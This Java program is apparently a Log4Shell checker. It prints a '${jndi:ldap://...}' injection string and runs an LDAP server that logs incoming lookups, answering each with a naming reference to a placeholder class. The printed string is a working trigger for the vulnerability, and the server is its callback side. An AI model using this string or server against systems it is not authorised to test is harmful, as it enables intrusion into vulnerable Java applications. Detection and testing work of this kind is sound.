package itzbenz;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.IOException;
import java.net.InetAddress;

public class MainAlerter extends InMemoryOperationInterceptor {
    public static int port = 1389;
    public static String address = "0.0.0.0";

    public static void main(String[] args) throws IOException, LDAPException {
        if (args.length != 0) {
            String[] addressAndPort = args[0].split(":");
            address = addressAndPort[0];
            if (addressAndPort.length == 2) {
                port = Integer.parseInt(addressAndPort[1]);
            }
        }
        System.out.println();
        System.out.println();
        System.out.println("${jndi:ldap://" + address + ":" + port + "/o=reference,payload=Vulnerable}");
        System.out.println();
        System.out.println();
        System.out.println("Starting LDAP server on 0.0.0.0:1389");
        InMemoryDirectoryServerConfig inMemoryOperationInterceptor = new InMemoryDirectoryServerConfig("dc=example,dc=com");
        inMemoryOperationInterceptor.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("0.0.0.0"),
                1389,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));
        inMemoryOperationInterceptor.addInMemoryOperationInterceptor(new MainAlerter());
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(inMemoryOperationInterceptor);
        ds.startListening();
    }

    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String base = result.getRequest().getBaseDN();
        String payload = base;
        try {
            payload = base.split(",")[1].split("=")[1];
        } catch (IndexOutOfBoundsException e) {
            //System.out.println("Malformed Payload Skipping Parse");
        }
        System.out.println();
        System.out.println("[+] Requested Payload: " + payload);
        Entry e = new Entry(base);
        e.addAttribute("objectClass", "javaNamingReference");//cool
        e.addAttribute("javaClassName", "Vulnerable.Log4Shellllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll"); //unknown if fail
        e.addAttribute("javaFactory", "Vulnerable.Log4Shellllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll"); //magic payload
        try {
            result.sendSearchEntry(e);
        } catch (LDAPException ex) {
            ex.printStackTrace();//uncool
        }
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));//great success
    }

}
